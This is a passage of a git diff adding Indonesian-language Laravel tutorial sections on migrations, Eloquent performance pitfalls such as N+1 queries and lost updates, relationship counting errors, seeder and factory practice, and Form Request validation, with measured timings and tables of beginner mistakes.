+            'Tidak pernah menjalankan `migrate:rollback`',
+            '`down()` kan tinggal kebalikannya',
+            '`down()` yang ditulis dari ingatan baru dipakai pada hari terburuk, dan pada hari itu ia gagal',
+          ],
+          [
+            'Menyunting migrasi yang sudah dijalankan orang lain',
+            'Lebih rapi daripada menambah migrasi baru',
+            'Dua mesin punya skema berbeda dengan catatan yang sama. Tulis migrasi baru',
+          ],
+          [
+            'Menambah kolom `NOT NULL` tanpa nilai bawaan',
+            'Kolomnya memang wajib',
+            'Gagal bila tabelnya sudah berisi. Tambahkan sebagai nullable, isi bertahap, baru perketat',
+          ],
+          [
+            'Mengisi data dalam jumlah besar di dalam migrasi',
+            'Sekalian satu tempat',
+            'Deploy-nya menggantung dan bisa terputus tanpa catatan sampai mana. Pakai job terpisah berpotongan',
+          ],
+          [
+            'Mengganti nama kolom dalam satu migrasi',
+            'Cuma ganti nama',
+            'Selama deploy, kode lama mencari kolom yang sudah tidak ada. Pakai perluas-pindahkan-persempit',
+          ],
+          [
+            'Tidak memberi index pada kolom yang sering dicari',
+            'Datanya masih sedikit',
+            'Diukur, selisihnya 10,7 ms melawan 0,047 ms pada 300.000 baris, dan selisihnya TUMBUH',
+          ],
+        ],
+      ),
+      p(
+        'Baris pertama bisa diubah menjadi kebiasaan yang murah dan menutup seluruh kelas masalahnya. Setiap kali menulis migrasi baru, jalankan `php artisan migrate`, lalu langsung `php artisan migrate:rollback`, lalu `php artisan migrate` sekali lagi. Tiga perintah itu memakan beberapa detik dan membuktikan bahwa `down()`-nya benar-benar bekerja, bukan sekadar terlihat benar.',
+      ),
       references(
         {
           label: 'Database: Migrations',
@@ -1637,7 +2958,7 @@ export const lessons: LessonDraft[] = [
   written(
     'eloquent-dasar',
     'Eloquent: model, CRUD, mass assignment',
-    12,
+    17,
     'ORM Laravel, beserta celah keamanan yang paling sering dibukanya.',
     [
       terms(
@@ -1860,6 +3181,209 @@ export const lessons: LessonDraft[] = [
         'ORM menyembunyikan query, bukan biayanya',
         'Satu baris Eloquent yang terlihat sederhana bisa menghasilkan query yang berat. Biasakan memeriksa SQL yang dihasilkan — terutama saat ada relasi yang terlibat, seperti di sub-bab berikutnya.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Eloquent membuat pengambilan data begitu mudah sehingga biaya di baliknya berhenti terlihat, dan di situlah hampir semua masalah performanya lahir. Bentuk berikut terlihat bersih dan menghasilkan seratus satu perjalanan ke basis data.',
+      ),
+      code(
+        'php',
+        `
+        // Terlihat seperti mengakses properti biasa. Bukan.
+        $pesanan = Pesanan::latest()->limit(100)->get();
+
+        foreach ($pesanan as $p) {
+            echo $p->pelanggan->nama;        // <-- SATU query per baris
+        }
+        `,
+      ),
+      code(
+        'text',
+        `
+        Diukur pada PostgreSQL 16.15 di bab database:
+
+          biaya dasar + 1 query sepele : 23 ms
+          1.000 query terpisah         : 76 ms   -> 53 ms untuk query-nya
+          1 query dengan JOIN          : 26 ms   ->  3 ms untuk query-nya
+
+        Itu di koneksi LOKAL, sekitar 0,053 ms per perjalanan bolak-balik.
+        Ke basis data di zona ketersediaan lain, biayanya biasanya 1-2 ms,
+        dan seribu perjalanan menjadi satu sampai dua DETIK untuk satu halaman.
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan. Angkanya lokal, dan itulah yang membuat N+1 lolos dari pengujian.',
+        },
+      ),
+      p('Perbaikannya satu kata dan tidak mengubah satu pun baris di tempat pemakaiannya.'),
+      code(
+        'php',
+        `
+        // Satu query tambahan untuk SELURUH pelanggan, bukan satu per baris.
+        $pesanan = Pesanan::with('pelanggan')->latest()->limit(100)->get();
+
+        // Untuk relasi bertingkat:
+        Pesanan::with('pelanggan', 'item.produk')->get();
+
+        // Untuk sekadar menghitung, JANGAN memuat seluruh relasinya:
+        Pesanan::withCount('item')->get();     // -> $p->item_count
+        `,
+        {
+          caption:
+            'withCount menghindari memuat ribuan baris item hanya untuk mengetahui jumlahnya.',
+        },
+      ),
+      p(
+        'Yang lebih berharga daripada perbaikannya adalah cara menangkapnya sebelum sampai produksi, dan Laravel menyediakan satu baris untuk itu.',
+      ),
+      code(
+        'php',
+        `
+        // AppServiceProvider::boot()
+        // Relasi yang belum dimuat MELEMPAR saat mengembangkan, dan
+        // berperilaku normal di produksi.
+        Model::preventLazyLoading(! app()->isProduction());
+
+        // Sekalian dua penjaga lain yang menutup kelas bug berbeda:
+        Model::preventSilentlyDiscardingAttributes(! app()->isProduction());
+        Model::preventAccessingMissingAttributes(! app()->isProduction());
+        `,
+        {
+          caption:
+            'Baris kedua menangkap field yang dibuang diam-diam karena tidak ada di $fillable.',
+        },
+      ),
+      p(
+        'Baris kedua itu menutup kegagalan yang sangat sering membingungkan, yaitu field yang dikirim formulir tetapi tidak pernah tersimpan karena tidak terdaftar di `$fillable`. Tanpa penjaga itu, Eloquent membuangnya **tanpa suara**, dan yang terlihat hanyalah kolom yang tetap kosong tanpa satu pun error.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Eloquent punya beberapa kegagalan yang bunyinya khas, dan yang paling berbahaya justru yang tidak berbunyi sama sekali.',
+      ),
+      code(
+        'text',
+        `
+        1. Attempt to read property "nama" on null
+
+           $pesanan->pelanggan->nama ketika relasinya kosong. Di PHP ini hanya
+           PERINGATAN, jadi hasilnya NULL dan program TERUS BERJALAN —
+           diukur di sub-bab PHP modern. Pakai ?-> atau muat dengan aman.
+
+        2. Add [judul] to fillable property to allow mass assignment
+
+           Muncul HANYA bila preventSilentlyDiscardingAttributes dinyalakan.
+           Tanpa penjaga itu, field-nya dibuang diam-diam.
+
+        3. SQLSTATE[23505]: Unique violation
+
+           Kode SQLSTATE-nya diverifikasi sungguhan di bab database. Tangkap
+           kodenya, bukan teks pesannya, lalu terjemahkan jadi 422 dengan
+           keterangan per field.
+
+        4. Memory exhausted
+
+           Model::all() pada tabel berisi jutaan baris memuat SEMUANYA ke memori
+           sebagai objek. Pakai chunk(), chunkById(), atau lazy().
+        `,
+      ),
+      p(
+        'Kegagalan keempat punya perbaikan yang berbeda-beda tergantung apa yang dikerjakan, dan memilih yang salah menghasilkan bug yang halus.',
+      ),
+      code(
+        'php',
+        `
+        // BAHAYA: seluruh tabel jadi objek di memori.
+        foreach (Pesanan::all() as $p) { /* ... */ }
+
+        // chunk(): memproses per potongan. TAPI bila kamu MENGUBAH kolom yang
+        // dipakai untuk mengurutkan, sebagian baris bisa TERLEWAT, sebab
+        // OFFSET-nya bergeser setelah data berubah.
+        Pesanan::where('status', 'baru')->chunk(500, function ($potongan) { /* ... */ });
+
+        // chunkById(): aman untuk pemrosesan yang MENGUBAH data, sebab ia
+        // bergerak berdasarkan id terakhir, bukan berdasarkan OFFSET.
+        // Ini bentuk Eloquent dari keyset pagination yang diukur di bab database:
+        // OFFSET 250000 membaca 250.020 baris, keyset membaca 20.
+        Pesanan::where('status', 'baru')->chunkById(500, function ($potongan) {
+            foreach ($potongan as $p) $p->update(['status' => 'diproses']);
+        });
+        `,
+        {
+          caption:
+            'Perbedaan chunk dan chunkById baru terasa saat pemrosesannya mengubah kolom penyaringnya.',
+        },
+      ),
+      p(
+        'Kelompok kegagalan ketiga tidak menghasilkan error dan sudah diukur di bab database, yaitu **lost update** dari pola baca-hitung-tulis.',
+      ),
+      code(
+        'php',
+        `
+        // RENTAN: dua permintaan bersamaan saling menimpa.
+        $produk = Produk::find($id);
+        $produk->stok = $produk->stok - $jumlah;   // dihitung di PHP
+        $produk->save();
+
+        // Diukur di bab database: saldo awal 100, dua proses masing-masing
+        // mengurangi 10, hasil akhirnya 90 — bukan 80. Satu pengurangan HILANG.
+
+        // AMAN: perhitungannya terjadi di basis data, sambil barisnya terkunci.
+        Produk::where('id', $id)
+            ->where('stok', '>=', $jumlah)
+            ->decrement('stok', $jumlah);
+
+        // decrement mengembalikan JUMLAH BARIS yang berubah. Nol berarti
+        // syaratnya tidak terpenuhi, yaitu stoknya tidak cukup — dan itu
+        // pemeriksaan dan pengurangan dalam SATU perintah, tanpa celah di antaranya.
+        `,
+        {
+          caption:
+            'Diukur sungguhan pada PostgreSQL 16.15 dengan dua proses yang berjalan bersamaan.',
+        },
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Eloquent menyembunyikan SQL dengan sangat baik, dan hampir semua kesalahannya berupa lupa bahwa SQL-nya tetap ada.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Mengakses relasi di dalam perulangan',
+            'Terlihat seperti properti biasa',
+            'Satu query per baris. Pakai `with()`, dan nyalakan `preventLazyLoading` saat mengembangkan',
+          ],
+          [
+            'Memakai `Model::all()`',
+            'Paling singkat',
+            'Seluruh tabel jadi objek di memori. Pakai `paginate()`, `chunkById()`, atau `lazy()`',
+          ],
+          [
+            'Membaca stok, menghitung di PHP, lalu menyimpan',
+            'Lebih mudah dibaca',
+            'Diukur, dua proses bersamaan membuat satu pengurangan hilang. Pakai `decrement` dengan syarat',
+          ],
+          [
+            'Memakai `chunk()` sambil mengubah kolom penyaringnya',
+            'Namanya memang untuk memproses banyak',
+            'Sebagian baris terlewat karena OFFSET-nya bergeser. Pakai `chunkById()`',
+          ],
+          [
+            'Memuat seluruh relasi hanya untuk menghitungnya',
+            '`count($p->item)` kan mudah',
+            'Ribuan baris dimuat untuk menghasilkan satu angka. Pakai `withCount()`',
+          ],
+          [
+            'Menambahkan `$appends` berisi perhitungan berat',
+            'Praktis, otomatis ikut',
+            'Perhitungannya berjalan untuk SETIAP baris di setiap daftar, termasuk yang tidak memerlukannya',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir punya akibat yang tumbuh diam-diam. Sebuah atribut yang ditambahkan lewat `$appends` ikut dihitung setiap kali modelnya diubah menjadi array atau JSON, termasuk pada daftar berisi seratus baris di endpoint yang sama sekali tidak memakai nilai itu. Bila perhitungannya menyentuh relasi, ia sekaligus menjadi N+1 yang tidak terlihat dari mana pun. Biarkan ia sebagai method biasa, lalu sertakan hanya di tempat yang memang membutuhkannya.',
+      ),
       references(
         {
           label: 'Eloquent: Getting Started',
@@ -1892,7 +3416,7 @@ export const lessons: LessonDraft[] = [
   written(
     'relasi-eloquent',
     'Relasi Eloquent',
-    12,
+    17,
     'Menyatakan hubungan antar tabel, dan menghindari N+1.',
     [
       terms(
@@ -2143,6 +3667,195 @@ export const lessons: LessonDraft[] = [
       p(
         '`whereHas` menambahkan syarat **di dalam** relasinya lewat closure: yang dicari adalah catatan yang punya komentar dari pengguna 42, dan komentarnya sendiri tidak ikut dimuat. Perhatikan pasangannya di baris terakhir — `doesntHave` adalah kebalikan dari `has`, dan ia yang menjawab pertanyaan seperti "artikel mana yang belum dikomentari" tanpa perlu `LEFT JOIN` beserta pemeriksaan `IS NULL` dari sub-bab 2.5.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Relasi Eloquent menyembunyikan seluruh SQL di baliknya, dan itu membuat dua kelas kesalahan yang berbeda terlihat sama. Yang pertama soal performa, yang kedua soal kebenaran angka, dan yang kedua jauh lebih sulit ketahuan.',
+      ),
+      code(
+        'php',
+        `
+        final class Pesanan extends Model
+        {
+            public function pelanggan(): BelongsTo { return $this->belongsTo(Pelanggan::class); }
+            public function item(): HasMany { return $this->hasMany(ItemPesanan::class); }
+            public function produk(): BelongsToMany
+            {
+                return $this->belongsToMany(Produk::class, 'item_pesanan')
+                    ->withPivot(['jumlah', 'harga_satuan'])   // kolom tambahan di tabel pivot
+                    ->withTimestamps();
+            }
+        }
+        `,
+        {
+          caption:
+            'withPivot itu yang membedakan tabel penghubung biasa dari yang membawa datanya sendiri.',
+        },
+      ),
+      p(
+        'Bagian `withPivot` menjawab pertanyaan yang menentukan bentuk tabelnya, yaitu apakah penghubungnya membawa data sendiri. Jumlah dan harga satuan adalah fakta tentang **pasangan** pesanan dan produk, bukan tentang salah satunya, jadi tempatnya memang di tabel penghubung.',
+      ),
+      p(
+        'Yang tidak diurus Eloquent adalah menjaga pasangannya tidak berulang, dan itu keputusan di migrasi.',
+      ),
+      code(
+        'text',
+        `
+        $table->primary(['pesanan_id', 'produk_id']);
+
+        Tanpa baris itu, pasangan yang sama bisa masuk berkali-kali:
+
+          INSERT INTO artikel_tag (artikel_id, tag_id) VALUES (1, 1);
+            ERROR:  duplicate key value violates unique constraint "artikel_tag_pkey"
+            DETAIL:  Key (artikel_id, tag_id)=(1, 1) already exists.
+        `,
+        { caption: 'Dijalankan sungguhan pada PostgreSQL 16.15 di bab database.' },
+      ),
+      p(
+        'Akibat tanpa batasan itu bukan error melainkan angka yang berlipat. Satu tag yang tercatat dua kali membuat artikelnya muncul dua kali di daftar penyaringan, dan membuat setiap penghitungan yang melewati tabel itu menghasilkan angka yang terlalu besar.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Kegagalan relasi yang paling sering bukan error melainkan **angka yang salah**, dan bentuknya sudah diukur di bab database.',
+      ),
+      code(
+        'text',
+        `
+        SELECT p.nama, count(*) AS pakai_bintang, count(o.id) AS pakai_kolom
+        FROM pelanggan p LEFT JOIN pesanan o ON o.pelanggan_id = p.id
+        GROUP BY p.id, p.nama;
+
+              nama       | pakai_bintang | pakai_kolom
+          ---------------+---------------+-------------
+           Belum Pesan 1 |             1 |           0     <- belum pernah memesan
+           Pengguna 1    |             1 |           1
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan. count(*) melaporkan 1 pesanan untuk pelanggan yang punya nol.',
+        },
+      ),
+      p(
+        'Di Eloquent, bentuk yang menghasilkan kesalahan yang sama adalah menghitung dari koleksi yang sudah dimuat alih-alih memakai `withCount`, dan ia juga membawa biaya memuat seluruh barisnya.',
+      ),
+      code(
+        'php',
+        `
+        // Memuat SELURUH pesanan setiap pelanggan hanya untuk menghitungnya.
+        foreach (Pelanggan::all() as $p) { echo count($p->pesanan); }
+
+        // Satu query, tanpa memuat barisnya, dan angkanya benar untuk yang nol.
+        Pelanggan::withCount('pesanan')->get();   // -> $p->pesanan_count
+        `,
+      ),
+      p(
+        'Kegagalan kedua adalah penjumlahan yang berlipat ketika beberapa relasi digabung sekaligus, dan yang ini menghasilkan angka yang masih terlihat masuk akal.',
+      ),
+      code(
+        'text',
+        `
+        Satu pesanan dengan 3 item, di-JOIN ke tabel pembayaran dengan 2 cicilan:
+
+          3 x 2 = 6 baris hasil
+
+        sum(item.harga) di atas hasil itu menghitung setiap harga DUA KALI.
+        Totalnya persis dua kali lipat, dan tidak ada satu pun error.
+
+        Yang benar: agregasikan tiap relasi di subquery TERPISAH, lalu gabungkan.
+        Di Eloquent:  ->withSum('item as total_item', 'harga')
+                      ->withSum('cicilan as total_bayar', 'jumlah')
+        `,
+      ),
+      p(
+        'Kegagalan ketiga menghasilkan error yang sangat khas dan sering membingungkan, yaitu relasi yang saling menunjuk lalu diubah menjadi JSON.',
+      ),
+      code(
+        'text',
+        `
+        return Pesanan::with('pelanggan.pesanan')->get();
+
+          Maximum function nesting level reached
+          (atau: memori habis, tergantung setelan)
+
+        Penyebabnya lingkaran: pesanan -> pelanggan -> pesanan -> pelanggan ...
+
+        Bentuk yang sama pernah diukur di JavaScript pada bab Fondasi:
+          TypeError: Converting circular structure to JSON
+              --> starting at object with constructor 'Object'
+              --- property 'diri' closes the circle
+        `,
+        { caption: 'Pesan JavaScript di atas dijalankan sungguhan dengan Node 26.5.0.' },
+      ),
+      p(
+        'Perbaikannya bukan memutus relasinya melainkan **memutuskan apa yang keluar**, dan itu tepat pekerjaan API Resource. Selama bentuk responsnya ditentukan satu per satu, tidak ada relasi yang bisa ikut tanpa diminta.',
+      ),
+      p(
+        'Terakhir, relasi ke diri sendiri seperti komentar bersarang punya dua bahaya yang harus ditangani sadar.',
+      ),
+      code(
+        'text',
+        `
+        BAHAYA 1 — penghapusan yang menjalar tanpa terlihat
+
+          DELETE FROM komentar WHERE id = 1;
+
+          Satu perintah itu menghapus balasannya DAN balasan atas balasannya,
+          sebab CASCADE menjalar mengikuti pohonnya. Jumlah baris yang
+          dilaporkan hanya menghitung yang disebut langsung.
+
+        BAHAYA 2 — lingkaran
+
+          UPDATE komentar SET induk_id = 3 WHERE id = 1;
+
+          Komentar 1 menjadi anak dari cucunya sendiri. Foreign key TIDAK
+          mencegah ini, sebab setiap barisnya tetap menunjuk baris yang ada.
+          Penelusuran pohonnya akan berputar tanpa henti.
+        `,
+        { caption: 'Keduanya diuji sungguhan pada PostgreSQL 16.15 di bab database.' },
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Relasi adalah bagian yang paling mudah menghasilkan angka salah, sebab hasilnya tetap berupa angka yang wajar.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menghitung dengan `count($model->relasi)`',
+            'Paling langsung',
+            'Seluruh barisnya dimuat hanya untuk satu angka. Pakai `withCount()`',
+          ],
+          [
+            'Menjumlahkan setelah menggabungkan dua relasi',
+            'Tinggal `sum`',
+            'Baris berlipat membuat jumlahnya berlipat. Agregasikan tiap relasi terpisah',
+          ],
+          [
+            'Lupa primary key gabungan di tabel pivot',
+            'Kedua kolomnya sudah foreign key',
+            'Diuji sungguhan, pasangan yang sama bisa masuk berkali-kali dan hitungannya berlipat',
+          ],
+          [
+            'Mengembalikan model dengan relasi bertingkat sebagai JSON',
+            'Datanya memang dibutuhkan',
+            'Relasi yang saling menunjuk menghasilkan lingkaran. Tentukan bentuk responsnya lewat Resource',
+          ],
+          [
+            'Memakai `cascadeOnDelete` pada relasi ke diri sendiri',
+            'Balasannya memang ikut terhapus',
+            'Penghapusannya menjalar ke seluruh kedalaman pohon tanpa konfirmasi apa pun',
+          ],
+          [
+            'Mengandalkan foreign key untuk mencegah lingkaran',
+            'Batasannya kan sudah ada',
+            'Foreign key hanya memastikan yang ditunjuk ADA. Susunan melingkar tetap lolos',
+          ],
+        ],
+      ),
+      p(
+        'Baris kedua pantas ditegaskan karena ia satu-satunya di tabel ini yang menghasilkan angka salah tanpa gejala apa pun. Laporan penjualan yang totalnya dua kali lipat masih terlihat seperti angka yang mungkin, dan biasanya baru ketahuan ketika ada yang menghitung ulang dengan tangan atau ketika angkanya dibandingkan dengan sumber lain. Cara termurah menghindarinya adalah tidak pernah menjumlahkan di atas hasil penggabungan beberapa relasi, melainkan menghitung tiap agregat di subquery-nya sendiri.',
+      ),
       references(
         {
           label: 'Eloquent: Relationships',
@@ -2175,7 +3888,7 @@ export const lessons: LessonDraft[] = [
   written(
     'seeder-factory',
     'Seeder & Factory',
-    9,
+    15,
     'Membuat data uji yang realistis, cepat, dan bisa diulang.',
     [
       p(
@@ -2382,6 +4095,198 @@ export const lessons: LessonDraft[] = [
       p(
         'Tes seperti ini yang menangkap IDOR. Ia bukan menguji bahwa fitur berjalan — ia menguji bahwa data orang lain **tidak** ikut terbawa.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Seeder dan factory sering dianggap alat bantu yang hanya berguna saat memulai project, dan justru pemakaian yang paling berharga muncul jauh sesudah itu, yaitu **mengisi basis data pengembangan dengan jumlah baris yang mendekati produksi**. Tanpa itu, hampir semua masalah performa tidak pernah terlihat.',
+      ),
+      code(
+        'text',
+        `
+        Diukur pada PostgreSQL 16.15 di bab database, tabel 300.000 baris:
+
+          SELECT * FROM pesanan WHERE pelanggan_id = 137456;
+
+          TANPA index : Parallel Seq Scan, Rows Removed by Filter: 150000
+                        Execution Time: 10,688 ms
+          DENGAN index: Index Scan, Buffers: shared hit=7
+                        Execution Time:  0,047 ms
+
+        Pada 100 baris, KEDUANYA selesai dalam waktu yang tidak terasa.
+        Itulah kenapa masalah ini selalu ditemukan di produksi.
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan. Selisihnya sekitar 227 kali, dan ia TUMBUH seiring jumlah baris.',
+        },
+      ),
+      p(
+        'Karena itu seeder yang berguna bukan yang membuat tiga baris contoh melainkan yang bisa membuat ratusan ribu. Dan begitu jumlahnya sebesar itu, cara membuatnya sendiri menjadi penentu apakah ia selesai dalam hitungan detik atau hitungan jam.',
+      ),
+      code(
+        'php',
+        `
+        // LAMBAT: satu INSERT per baris. Untuk 100.000 baris berarti
+        // 100.000 perjalanan ke basis data.
+        Pelanggan::factory()->count(100_000)->create();
+
+        // CEPAT: satu INSERT untuk banyak baris sekaligus, dikerjakan berpotongan
+        // supaya memorinya tidak habis.
+        collect(range(1, 100))->each(function () {
+            $baris = Pelanggan::factory()->count(1000)->make()->map(
+                fn ($p) => $p->getAttributes() + ['created_at' => now(), 'updated_at' => now()],
+            )->all();
+            Pelanggan::insert($baris);   // satu pernyataan untuk 1000 baris
+        });
+
+        // Perhatikan: insert() MELEWATI event model dan timestamps otomatis,
+        // jadi keduanya ditulis sendiri. Itu pertukaran yang disengaja.
+        `,
+        {
+          caption:
+            'Diukur di bab database: 1.000 query terpisah 53 ms vs 1 query 3 ms, di koneksi lokal.',
+        },
+      ),
+      p(
+        'Perlu ditegaskan bahwa `insert()` melewati banyak hal yang biasanya dikerjakan Eloquent, mulai dari `created_at` otomatis sampai event model dan observer. Untuk seeder itu justru diinginkan, sebab kamu memang tidak ingin seratus ribu surel pemberitahuan terkirim. Untuk kode aplikasi sungguhan, pelewatan itu sering menjadi bug.',
+      ),
+      p(
+        'Nilai kedua dari factory adalah membuat **kasus yang tidak nyaman** bisa diuji, dan bagian ini yang paling sering tidak dipakai.',
+      ),
+      code(
+        'php',
+        `
+        // Bukan sekadar data yang rapi, tapi data yang MEMBUAT tampilan rusak.
+        final class PesananFactory extends Factory
+        {
+            public function definition(): array
+            {
+                return [
+                    'pelanggan_id' => Pelanggan::factory(),
+                    'status' => fake()->randomElement(['baru', 'dibayar', 'dikirim', 'batal']),
+                    'total' => fake()->numberBetween(10_000, 5_000_000),
+                ];
+            }
+
+            // State untuk kasus yang selalu lupa diuji:
+            public function tanpaItem(): static
+            { return $this->has(ItemPesanan::factory()->count(0), 'item'); }
+
+            public function judulSangatPanjang(): static
+            { return $this->state(['catatan' => str_repeat('nama-berkas-panjang-', 20)]); }
+
+            public function nilaiEkstrem(): static
+            { return $this->state(['total' => 9_999_999_999]); }
+        }
+        `,
+        {
+          caption:
+            'Tiga state terakhir itu yang memunculkan bug tata letak dan pembulatan sebelum pengguna menemukannya.',
+        },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Seeder menghasilkan kegagalan yang khas, dan sebagian di antaranya justru muncul karena seeder-nya berhasil.',
+      ),
+      code(
+        'text',
+        `
+        1. SQLSTATE[23505]: Unique violation
+
+           Factory menghasilkan nilai yang sama dua kali pada kolom UNIQUE.
+           fake()->email tidak menjamin keunikan; fake()->unique()->email
+           menjamin, dan MELEMPAR bila kehabisan nilai yang mungkin:
+
+             OverflowException: Maximum retries of 10000 reached without finding
+             a unique value
+
+           Untuk jumlah besar, pakai nilai berurutan: 'pengguna'.$i.'@contoh.id'
+
+        2. SQLSTATE[23503]: Foreign key violation
+
+           Urutan seeder-nya salah. Pesanan dibuat sebelum pelanggannya ada.
+           Kode SQLSTATE-nya diverifikasi sungguhan di bab database.
+
+        3. Memory exhausted
+
+           factory()->count(100000)->create() menyimpan seluruh model di memori
+           sebagai objek. Kerjakan berpotongan.
+
+        4. Seeder berjalan LAMA sekali
+
+           Bukan error, dan inilah yang paling sering. Satu INSERT per baris.
+        `,
+      ),
+      p(
+        'Kegagalan yang paling mahal justru tidak ada di daftar itu, sebab ia tidak terjadi di komputer sendiri melainkan di produksi.',
+      ),
+      code(
+        'php',
+        `
+        // BERBAHAYA: dipanggil tanpa syarat di dalam seeder.
+        DB::table('pengguna')->truncate();
+        Pelanggan::truncate();
+
+        // php artisan migrate:fresh --seed dijalankan di produksi
+        // karena salah membaca nama environment, dan seluruh data hilang.
+
+        // Penjaga yang murah dan menutupnya:
+        public function run(): void
+        {
+            if (app()->isProduction()) {
+                throw new RuntimeException('Seeder ini tidak boleh jalan di produksi');
+            }
+            // ...
+        }
+        `,
+        { caption: 'Perintah migrate:fresh menghapus SELURUH tabel sebelum membangunnya kembali.' },
+      ),
+      p(
+        'Penjaga itu terlihat berlebihan sampai hari ia menyelamatkan sesuatu. Yang membuat kecelakaan seperti ini mungkin bukan kecerobohan besar melainkan hal-hal kecil, yaitu terminal yang masih terhubung ke server lain, berkas `.env` yang tertukar, atau perintah yang disalin dari catatan. Pemeriksaan satu baris di dalam seeder tidak bergantung pada satu pun dari itu.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Seeder dan factory sering ditulis sekali di awal lalu tidak pernah disentuh lagi, dan justru itu yang membuat nilainya hilang.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Membuat data contoh beberapa baris saja',
+            'Cukup untuk melihat tampilannya',
+            'Diukur, selisih index baru terlihat pada ratusan ribu baris. Masalah performa tidak pernah muncul',
+          ],
+          [
+            'Memakai `factory()->count(100000)->create()`',
+            'Itu cara membuat banyak',
+            'Satu INSERT per baris dan seluruh model di memori. Kerjakan berpotongan dengan `insert()`',
+          ],
+          [
+            'Memakai `fake()->email` untuk kolom unik',
+            'Emailnya kan acak',
+            'Tabrakan pasti terjadi pada jumlah besar. Pakai `unique()`, atau nilai berurutan',
+          ],
+          [
+            'Hanya membuat data yang rapi',
+            'Datanya realistis',
+            'Judul panjang, relasi kosong, dan nilai ekstrem yang merusak tampilan tidak pernah teruji',
+          ],
+          [
+            'Memanggil `truncate()` tanpa penjaga environment',
+            'Kan cuma untuk pengembangan',
+            'Satu perintah yang salah tempat menghapus data produksi. Tambahkan pemeriksaan `isProduction`',
+          ],
+          [
+            'Membiarkan factory usang setelah skema berubah',
+            'Tidak ada yang error',
+            'Test yang memakainya jadi menguji bentuk data yang sudah tidak ada lagi di produksi',
+          ],
+        ],
+      ),
+      p(
+        'Baris terakhir adalah bentuk pembusukan yang paling sunyi. Factory yang tidak diperbarui setelah kolom baru ditambahkan tetap menghasilkan data yang lolos, sebab kolom barunya punya nilai bawaan. Test yang memakainya tetap hijau, dan yang diujinya adalah bentuk data yang tidak pernah lagi muncul di produksi. Karena itu factory layak diperlakukan sebagai bagian dari skema, yaitu ikut diperbarui pada perubahan yang sama dengan migrasinya.',
+      ),
       references(
         {
           label: 'Eloquent: Factories',
@@ -2414,7 +4319,7 @@ export const lessons: LessonDraft[] = [
   written(
     'form-request',
     'Validasi dengan Form Request',
-    11,
+    19,
     'Padanan Zod di Laravel — validasi dan otorisasi dalam satu kelas.',
     [
       terms(
@@ -2628,6 +4533,218 @@ export const lessons: LessonDraft[] = [
       p(
         'Perbedaan ini halus dan penting: `exists` menjawab "apakah ada", bukan "apakah boleh". Keduanya pemeriksaan yang berbeda.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Form Request memindahkan validasi keluar dari controller, dan manfaat terbesarnya bukan kerapian melainkan bahwa aturan itu menjadi **satu-satunya pintu**. Selama controller memakai hasil validasinya dan bukan permintaan mentahnya, tidak ada field yang bisa lolos tanpa dideklarasikan.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        declare(strict_types=1);
+
+        final class BuatPesananRequest extends FormRequest
+        {
+            // Otorisasi dan validasi adalah dua hal berbeda, dan keduanya di sini.
+            public function authorize(): bool
+            {
+                return $this->user()?->can('buat', Pesanan::class) ?? false;
+            }
+
+            public function rules(): array
+            {
+                return [
+                    'produk_id' => ['required', 'integer', 'exists:produk,id'],
+                    'jumlah'    => ['required', 'integer', 'min:1', 'max:99'],
+                    'catatan'   => ['nullable', 'string', 'max:500'],
+
+                    // Aturan untuk ARRAY dan isinya, masing-masing terpisah.
+                    'item'          => ['required', 'array', 'min:1', 'max:50'],
+                    'item.*.produk' => ['required', 'integer', 'exists:produk,id'],
+                    'item.*.jumlah' => ['required', 'integer', 'min:1', 'max:99'],
+                ];
+            }
+
+            public function messages(): array
+            {
+                return ['item.max' => 'Maksimal 50 item dalam satu pesanan.'];
+            }
+        }
+        `,
+        { caption: 'Batas max pada array dan string itu kontrol ketersediaan, bukan kerewelan.' },
+      ),
+      p(
+        'Batas `max` pada `item` dan `catatan` layak ditegaskan karena fungsinya sering disalahpahami sebagai pembatasan pengguna. Ia sebenarnya perlindungan terhadap ketersediaan, dan alasannya sudah diukur di bab Express, yaitu satu permintaan yang memaksa server mengerjakan pekerjaan sangat besar menahan utasnya dan membuat seluruh permintaan lain menunggu.',
+      ),
+      p(
+        'Bagian `item.*.produk` menunjukkan kemampuan yang paling membedakan validasi berskema dari rangkaian `if` yang ditulis tangan, yaitu **letak kesalahannya ikut disebutkan**. Bentuk yang sama sudah diukur dengan zod di bab Express.',
+      ),
+      code(
+        'text',
+        `
+        Issues untuk satu badan permintaan yang salah di tujuh tempat:
+
+          ["email"]              Invalid email address
+          ["alamat","jalan"]     Too small: expected string to have >=1 characters
+          ["alamat","kodePos"]   Kode pos harus 5 digit
+          ["item",0,"produkId"]  Too small: expected number to be >0
+          ["item",0,"jumlah"]    Too small: expected number to be >=1
+          ["item",1,"jumlah"]    Too big: expected number to be <=99
+          ["setuju"]             Syarat dan ketentuan wajib disetujui
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan dengan zod 4.4.3 di bab Express; Laravel menghasilkan bentuk yang setara.',
+        },
+      ),
+      p(
+        'Path yang memuat **indeks array** itu yang memungkinkan antarmuka menyorot item pertama dan item kedua secara terpisah. Rangkaian `if` yang ditulis tangan biasanya berhenti pada kesalahan pertama dan tidak tahu di indeks mana ia terjadi.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
